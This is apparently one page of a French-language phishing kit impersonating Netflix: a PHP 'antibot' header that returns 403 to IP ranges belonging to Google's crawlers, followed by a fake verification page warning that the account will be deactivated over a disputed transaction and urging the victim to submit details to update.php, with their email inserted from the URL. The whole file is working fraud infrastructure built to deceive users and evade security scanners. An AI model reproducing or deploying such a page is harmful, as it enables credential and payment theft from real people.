<?php
// Antibot protection
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// List of blocked IPs (simplified version from previous antibot configuration)
$blocked_ips = array(
    '/^64\..*/', '/^66\.102\..*/', '/^66\.249\..*/', '/^72\.14\..*/',
    '/^74\.125\..*/', '/^209\.85\..*/', '/^216\.239\..*/'
);

// Check if IP is blocked
foreach ($blocked_ips as $blocked_ip) {
    if (preg_match($blocked_ip, $ip)) {
        header('HTTP/1.0 403 Forbidden');
        exit('Access denied.');
    }
}

?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="short icon" href="Netflix_icon.svg-removebg-preview.png">
    <link rel="stylesheet" href="verif.css">
    <title>Netflix - Vérification</title>
</head>
<body>
    <h1 class="logo"><img src="photo_2024-09-22_00-07-17-removebg-preview.png" alt="Logo Netflix"></h1>
    <div class="container">
        <div class="login-container">
            <form action="update.php">
            <h1>Chér(e) <span id="userEmail">utilisateur</span>,</h1>
            <p>
                Notre système a détecté une contestation de transaction de votre part liée à votre abonnement Netflix. <br>
                Dans les jours à venir, votre compte sera automatiquement désactivé. <br>
                Si vous pensez qu'il s'agit d'une erreur de notre part, faites-le nous savoir en mettant à jour vos informations pour réactiver votre compte.
            </p>
            <button class="login-btn">Vérifier</button>
            </form>
        </div>
    </div>

    <script>
        // Récupération du paramètre d'email
        function getQueryParam(param) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(param);
        }

        // Affichage de l'email dans la page
        const userEmail = getQueryParam('email');
        if (userEmail) {
            document.getElementById('userEmail').textContent = userEmail;
        } else {
            document.getElementById('userEmail').textContent = "Utilisateur";
        }
        });
        
    </script>
</body>
</html>